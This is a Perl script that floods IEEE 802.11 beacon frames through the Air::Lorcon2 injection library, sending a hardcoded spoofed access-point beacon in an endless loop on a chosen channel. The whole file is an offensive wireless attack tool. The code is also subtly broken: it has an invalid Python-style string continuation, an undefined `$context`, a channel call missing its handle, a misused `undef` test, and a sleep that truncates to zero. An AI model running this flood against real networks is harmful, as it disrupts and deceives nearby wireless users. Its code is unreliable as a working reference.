#!/usr/bin/perl

# Made by Edoardo Mantovani, 2020

# perl translation for "beacon_flood_raw.py"

# beacon_flood_raw.pl - Simple IEEE 802.11
#	beacon flooder using Air::Lorcon2 raw
#	sending capabilities.


use strict;
use warnings;
use Air::Lorcon2 qw( :lorcon ); # import lorcon2 utilities

my $driver = shift or die "./beacon_flood_raw.pl <driver> <interface> <channel>\n";
my $interface = shift or die "./beacon_flood_raw.pl <driver> <interface> <channel>\n";
my $channel = shift or die "./beacon_flood_raw.pl <driver> <interface> <channel>\n";

sub usage() {
	print $0," - Simple 802.11 beacon flooder";
	print "-----------------------------------------------------\n" ;
	my $interval = 100;
	my $packet = ""\x80\x00\xff\xff\xff\xff\xff\xff" \
		"\xff\xff\x00\x0f\x66\xe3\xe4\x03" \
		"\x00\x0f\x66\xe3\xe4\x03\x00\x00" \
		"\xff\xff\xff\xff\xff\xff\xff\xff" \
		"\x64\x00\x11\x00\x00\x0f\x73\x6f" \
		"\x6d\x65\x74\x68\x69\x6e\x67\x63" \
		"\x6c\x65\x76\x65\x72\x01\x08\x82" \
		"\x84\x8b\x96\x24\x30\x48\x6c\x03" \
		"\x01\x01\x05\x04\x00\x01\x00\x00" \
		"\x2a\x01\x05\x2f\x01\x05\x32\x04" \
		"\x0c\x12\x18\x60\xdd\x05\x00\x10" \
		"\x18\x01\x01\xdd\x16\x00\x50\xf2" \
		"\x01\x01\x00\x00\x50\xf2\x02\x01" \
		"\x00\x00\x50\xf2\x02\x01\x00\x00" \
		"\x50\xf2\x02";

		my $drv = Air::Lorcon2::lorcon_find_driver( $driver ) or die $!;
		my $lorcon = Air::Lorcon2::lorcon_create( $interface, $driver ) or die $!;
		Air::Lorcon2::lorcon_open_injmon( $lorcon ) or die Air::Lorcon2::lorcon_get_error( $lorcon );
		my $vap = Air::Lorcon2::lorcon_get_vap( $lorcon ) or die Air::Lorcon2::lorcon_get_error( $lorcon );
		if(! undef( $vap ) ){
			print "[+]\t Monitor mode VAP: $vap\n";
			}

		# set the channel to inject
		Air::Lorcon2::lorcon_set_channel( $channel ) or die Air::Lorcon2::lorcon_get_error( $lorcon );
		sleep(1);
		print "using CHANNEL:  $channel\n"; 
		# flooding part
		my $sliptime = int( $interval / 1000 );
		while(1){
			Air::Lorcon2::lorcon_send_bytes( $lorcon, length( $packet ), $packet ) or die Air::Lorcon2::lorcon_get_error( $lorcon );
			sleep( $sliptime );
		
			}
		Air::Lorcon2::lorcon_close( $context ) or die $!;
}

&usage();
